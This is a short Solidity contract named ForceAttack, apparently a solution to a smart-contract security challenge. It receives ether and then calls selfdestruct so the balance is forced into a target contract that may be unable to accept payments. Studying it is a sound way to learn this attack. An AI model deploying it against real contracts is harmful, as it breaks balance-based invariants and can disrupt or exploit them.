// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {

    constructor() {}

    // Receive some ether first
    receive() external payable {}

    // selfdestruct and send the balance to the instance when called
    function attack (address payable instanceAddress) public {
        selfdestruct(instanceAddress);
    }

}